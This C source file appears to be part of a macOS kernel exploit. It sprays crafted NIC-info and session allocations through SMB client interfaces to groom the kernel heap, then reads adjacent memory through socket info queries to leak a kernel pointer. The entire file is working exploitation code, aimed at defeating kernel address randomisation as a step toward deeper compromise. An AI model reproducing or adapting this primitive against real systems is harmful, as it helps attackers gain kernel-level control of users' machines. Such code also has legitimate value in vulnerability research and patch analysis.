//
//  zalloc_kext_small.c
//  kmem_xepg
//
//  Created by admin on 12/27/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include <dispatch/dispatch.h>
#include <sys/proc_info.h>

#include "../smb/nic_allocator.h"
#include "../smb/ssn_allocator.h"

#include "zalloc_kext_small.h"
#include "neighbor_reader.h"
#include "allocator_rw.h"
#include "util_misc.h"
#include "util_binary.h"
#include "platform_constants.h"


#define NUM_PAD_ELEMENTS (XE_PAGE_SIZE / 32 * 5)
#define MAX_TRIES 64


struct kmem_zalloc_kext_small_entry kmem_zalloc_kext_small(const struct sockaddr_in* smb_addr, char* data, size_t data_size) {
    assert(data_size <= 256);
    kmem_neighour_reader_t reader = kmem_neighbor_reader_create();
    smb_nic_allocator pad_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    smb_nic_allocator element_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
    
    smb_ssn_allocator* size_allocators = alloca(sizeof(smb_ssn_allocator) * MAX_TRIES);
    dispatch_apply(MAX_TRIES, DISPATCH_APPLY_AUTO, ^(size_t index) {
        size_allocators[index] = smb_ssn_allocator_create(smb_addr, sizeof(*smb_addr));
    });
    
    struct network_nic_info pad_nics[NUM_PAD_ELEMENTS];
    bzero(pad_nics, sizeof(pad_nics));
    for (int i = 0; i < NUM_PAD_ELEMENTS; i++) {
        struct network_nic_info* info = &pad_nics[i];
        info->nic_index = i;
        info->addr_4.sin_family = AF_INET;
        info->addr_4.sin_len = 32;
        info->addr_4.sin_addr.s_addr = i;
        info->next_offset = sizeof(*info);
    }
    
    int error = smb_nic_allocator_allocate(pad_allocator, pad_nics, NUM_PAD_ELEMENTS, sizeof(pad_nics));
    assert(error == 0);
    
    char element_data[sizeof(struct network_nic_info) + 128];
    bzero(element_data, sizeof(element_data));
    
    struct kmem_zalloc_kext_small_entry alloc;
    alloc.element_allocator = element_allocator;
    
    for (int try = 0; try < MAX_TRIES; try++) {
        struct network_nic_info* info = (struct network_nic_info*)data;
        info->nic_index = 0;
        info->addr_4.sin_family = AF_INET;
        info->addr_4.sin_len = data_size + 8;
        info->addr_4.sin_addr.s_addr = try;
        
        int error = smb_nic_allocator_allocate(element_allocator, info, 1, sizeof(element_data));
        assert(error == 0);
        
        char* data = alloca(32);
        memset(data, 0x80, 32);
        
        error = smb_ssn_allocator_allocate(size_allocators[try], data, 32, data, 32, 16, 16, 16);
        assert(error == 0);
        
        memset(data, 0xff, 32);
        kmem_neighbor_reader_prepare(reader, data, 32);
        struct socket_fdinfo modified[8];
        size_t num_modified = XE_ARRAY_SIZE(modified);
        kmem_neighbor_reader_read_modified(reader, modified, &num_modified);
        
        for (int i = 0; i < num_modified; i++) {
            uintptr_t* addr = (uintptr_t*)&modified[i].psi.soi_proto.pri_un.unsi_addr.ua_sun;
            
            for (int j=0; j<32; j+=4) {
                if (addr[j] != 0 && (addr[j] & 255) == 0) {
                    printf("found ptr %p\n", (void*)addr[j]);
                    alloc.address = addr[j];
                    goto done;
                }
            }
        }
        
        kmem_neighbor_reader_reset(reader);
    }
    
done:
    smb_nic_allocator_destroy(&pad_allocator);
    dispatch_apply(MAX_TRIES, DISPATCH_APPLY_AUTO, ^(size_t index) {
        smb_ssn_allocator_destroy(&size_allocators[index]);
    });
    
    return alloc;
}
